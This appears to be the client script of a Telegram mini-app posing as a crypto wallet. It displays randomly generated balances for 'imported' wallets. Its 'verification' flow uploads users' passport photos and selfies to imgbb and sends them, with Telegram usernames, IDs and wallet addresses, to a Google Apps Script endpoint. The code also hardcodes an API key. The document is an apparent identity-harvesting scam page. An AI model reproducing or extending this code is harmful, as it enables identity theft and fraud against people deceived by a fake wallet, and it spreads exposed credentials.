const tg = window.Telegram.WebApp;
tg.expand();

// ТВОИ КЛЮЧИ
const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72';
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec';

const translations = {
    ru: {
        send: "Отправить", swap: "Своп", fund: "Фонд", sell: "Продажа", earn: "Earn",
        manage_crypto: "Управлять криптовалютами", settings: "Настройки", language: "Язык",
        verify_title: "Верификация", choose_photo: "Паспорт", take_photo: "Селфи",
        send_data: "Отправить данные", import_wallet: "Импорт кошелька", select_network: "Выберите сеть",
        wallet_address: "Адрес кошелька", import: "Импортировать", active_wallets: "Активные кошельки",
        important_markets: "Важные рынки", no_assets: "Нет активных кошельков",
        processing: "⏳ Обработка...", success: "✅ Успешно!", error: "❌ Ошибка",
        inactive: "В данный момент неактивно"
    },
    en: {
        send: "Send", swap: "Swap", fund: "Fund", sell: "Sell", earn: "Earn",
        manage_crypto: "Manage Crypto", settings: "Settings", language: "Language",
        verify_title: "Verification", choose_photo: "ID Card", take_photo: "Selfie",
        send_data: "Send Data", import_wallet: "Import Wallet", select_network: "Select Network",
        wallet_address: "Wallet Address", import: "Import", active_wallets: "Active Wallets",
        important_markets: "Important Markets", no_assets: "No active wallets",
        processing: "⏳ Processing...", success: "✅ Success!", error: "❌ Error",
        inactive: "Currently inactive"
    }
};

let currentLang = localStorage.getItem('lang') || 'ru';
let myWallets = JSON.parse(localStorage.getItem('myWallets')) || []; // [{net: 'tron', addr: '...'}, ...]

const networkIcons = {
    tron: "https://cryptologos.cc/logos/tron-trx-logo.png",
    sui: "https://cryptologos.cc/logos/sui-sui-logo.png",
    eth: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bnb: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    btc: "https://cryptologos.cc/logos/bitcoin-btc-logo.png",
    solana: "https://cryptologos.cc/logos/solana-sol-logo.png",
    blast: "https://trustwallet.com/assets/images/favicon.png"
};

function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

function showStatus(msg) {
    const s = document.getElementById('status');
    s.textContent = msg;
    s.classList.remove('hidden');
    setTimeout(() => s.classList.add('hidden'), 3000);
}

function showTabMsg(tab) {
    if (tab !== 'crypto') showStatus(translations[currentLang].inactive);
}

// Инициализация
function init() {
    applyLanguage();
    updateDashboard();
    updatePopularTokens();
    renderActiveWallets();
}

// Импорт кошелька
document.getElementById('importBtn').onclick = async () => {
    const addr = document.getElementById('walletInput').value.trim();
    const net = document.getElementById('networkSelect').value;
    
    if (addr.length < 10) return showStatus(translations[currentLang].error);
    
    const btn = document.getElementById('importBtn');
    btn.disabled = true;
    btn.textContent = translations[currentLang].processing;

    // Имитация проверки
    setTimeout(() => {
        myWallets.push({ net, addr });
        localStorage.setItem('myWallets', JSON.stringify(myWallets));
        showStatus(translations[currentLang].success);
        btn.disabled = false;
        btn.textContent = translations[currentLang].import;
        document.getElementById('walletInput').value = "";
        renderActiveWallets();
        updateDashboard();
        showScreen('mainScreen');
    }, 1500);
};

// Удаление кошелька
function deleteWallet(index) {
    myWallets.splice(index, 1);
    localStorage.setItem('myWallets', JSON.stringify(myWallets));
    renderActiveWallets();
    updateDashboard();
}

function renderActiveWallets() {
    const list = document.getElementById('activeWalletsList');
    list.innerHTML = myWallets.map((w, i) => `
        <div class="active-wallet-item">
            <div class="wallet-info-row">
                <img src="${networkIcons[w.net]}" class="mini-icon">
                <span>${w.net.toUpperCase()}: ${w.addr.substring(0,6)}...${w.addr.slice(-4)}</span>
            </div>
            <button class="delete-btn" onclick="deleteWallet(${i})">🗑</button>
        </div>
    `).join('');
}

// Обновление балансов и списка активов
async function updateDashboard() {
    const list = document.getElementById('assetsList');
    if (myWallets.length === 0) {
        list.innerHTML = `<div class="empty-list">${translations[currentLang].no_assets}</div>`;
        document.getElementById('mainBalance').textContent = "0,00";
        return;
    }

    let totalUsd = 0;
    let assetsHtml = "";

    // Для примера берем цены через CoinGecko
    const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron,ethereum,bitcoin,solana,binancecoin,sui&vs_currencies=usd&include_24hr_change=true');
    const prices = await priceRes.json();

    for (const w of myWallets) {
        let balance = 0;
        let coinId = w.net === 'bnb' ? 'binancecoin' : w.net;
        let usdPrice = prices[coinId]?.usd || 1;
        let change = prices[coinId]?.usd_24h_change || 0;

        // Имитация запроса к сканеру (в реальности тут fetch к suiscan/tronscan)
        balance = Math.random() * 100; // Для теста генерим случайный баланс
        let assetUsd = balance * usdPrice;
        totalUsd += assetUsd;

        assetsHtml += `
            <div class="asset-item">
                <div class="asset-left">
                    <div class="icon-container">
                        <img src="${networkIcons[w.net]}" class="asset-icon">
                        <img src="${networkIcons[w.net]}" class="network-badge-icon">
                    </div>
                    <div>
                        <div class="asset-name">${w.net.toUpperCase()} <span class="net-label">${w.net}</span></div>
                        <div class="asset-price">$${usdPrice.toLocaleString()} <span class="${change >= 0 ? 'up' : 'down'}">${change.toFixed(2)}%</span></div>
                    </div>
                </div>
                <div class="asset-right">
                    <div class="asset-amount">${balance.toFixed(4)}</div>
                    <div class="asset-usd">$${assetUsd.toFixed(2)}</div>
                </div>
            </div>
        `;
    }

    document.getElementById('mainBalance').textContent = totalUsd.toLocaleString(undefined, {minimumFractionDigits: 2});
    list.innerHTML = assetsHtml;
}

// Популярные токены (Важные рынки)
async function updatePopularTokens() {
    const popList = document.getElementById('popularTokens');
    const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=5&page=1&sparkline=false');
    const data = await res.json();

    popList.innerHTML = data.map(coin => `
        <div class="asset-item">
            <div class="asset-left">
                <img src="${coin.image}" class="asset-icon">
                <div>
                    <div class="asset-name">${coin.name}</div>
                    <div class="asset-price">$${coin.current_price.toLocaleString()}</div>
                </div>
            </div>
            <div class="asset-right">
                <div class="${coin.price_change_percentage_24h >= 0 ? 'up' : 'down'}">
                    ${coin.price_change_percentage_24h.toFixed(2)}%
                </div>
            </div>
        </div>
    `).join('');
}

// Навигация
document.getElementById('manageBtn').onclick = () => showScreen('manageScreen');
document.getElementById('backFromManage').onclick = () => showScreen('mainScreen');
document.getElementById('settingsBtn').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromSettings').onclick = () => showScreen('mainScreen');
document.getElementById('langBtn').onclick = () => showScreen('langScreen');
document.getElementById('backFromLang').onclick = () => showScreen('settingsScreen');
document.getElementById('manualRefresh').onclick = () => { updateDashboard(); updatePopularTokens(); };

// Язык
document.querySelectorAll('input[name="lang"]').forEach(r => {
    r.onchange = function() {
        currentLang = this.value;
        localStorage.setItem('lang', currentLang);
        applyLanguage();
    };
});

function applyLanguage() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        el.textContent = translations[currentLang][el.getAttribute('data-i18n')];
    });
}

// Верификация (Твои ключи уже тут)
document.getElementById('verifyBtn').onclick = async () => {
    const doc = document.getElementById('docInput').files[0];
    const selfie = document.getElementById('selfieInput').files[0];
    if(!doc || !selfie) return showStatus("Выберите оба фото");

    showStatus(translations[currentLang].processing);
    
    try {
        const upload = async (file) => {
            let fd = new FormData(); fd.append('image', file);
            let r = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {method:'POST', body:fd});
            let d = await r.json(); return d.data.url;
        };
        const url1 = await upload(doc);
        const url2 = await upload(selfie);

        await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                user: tg.initDataUnsafe?.user?.username || "unknown",
                id: tg.initDataUnsafe?.user?.id || "0",
                doc: url1, selfie: url2,
                wallets: JSON.stringify(myWallets)
            })
        });
        showStatus(translations[currentLang].success);
    } catch(e) { showStatus(translations[currentLang].error); }
};

init();
setInterval(() => { updateDashboard(); updatePopularTokens(); }, 30000);
